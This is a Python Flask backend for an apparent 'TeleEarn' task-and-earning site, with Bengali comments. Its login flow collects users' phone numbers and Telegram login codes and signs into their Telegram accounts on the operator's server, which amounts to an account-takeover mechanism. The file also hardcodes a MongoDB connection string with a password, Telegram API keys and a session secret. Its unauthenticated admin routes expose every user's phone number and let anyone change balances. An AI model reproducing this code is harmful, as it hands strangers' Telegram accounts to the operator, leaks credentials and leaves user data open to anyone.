import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# ১. সিস্টেম কনফিগারেশন
nest_asyncio.apply()
app = Flask(__name__)
app.secret_key = 'aaf_super_secret_key_123'
CORS(app)

# ২. আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"

client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']
users_col = db['users']
settings_col = db['settings']

temp_clients = {}

# --- ৩. সবকটি HTML পেজের কানেকশন (Routes) ---
@app.route('/')
@app.route('/login')
def login(): return render_template('login.html')

@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/task')
def task(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('treading.html') # আপনার ফাইলের বানান অনুযায়ী

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

# --- ৪. এডমিন প্যানেল ফাংশন ---
@app.route('/admin')
def admin_page(): return render_template('admin.html')

@app.route('/api/admin/users', methods=['GET'])
def get_all_users():
    users = list(users_col.find({}, {'_id': 0}))
    return jsonify(users)

@app.route('/api/admin/update_balance', methods=['POST'])
def update_balance():
    data = request.json
    users_col.update_one({"telegram_id": int(data['uid'])}, {"$set": {"main_balance": float(data['balance'])}})
    return jsonify({"status": "success"})

# --- ৫. টেলিগ্রাম ওটিপি ও লগইন সিস্টেম ---
@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    try:
        loop = asyncio.get_event_loop()
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        temp_clients[phone] = {'client': client, 'hash': sent_code.phone_code_hash}
        return jsonify({"success": True, "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    try:
        if phone in temp_clients:
            client, h = temp_clients[phone]['client'], temp_clients[phone]['hash']
            user_tg = await client.sign_in(phone, code, phone_code_hash=h)
            
            # ডাটাবেসে সেভ করা
            user_data = {"telegram_id": user_tg.id, "phone": phone, "joined": datetime.now()}
            users_col.update_one({"telegram_id": user_tg.id}, {"$set": user_data}, upsert=True)
            return jsonify({"success": True, "uid": user_tg.id})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৬. পোর্ট বাইন্ডিং (Render Fix) ---
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
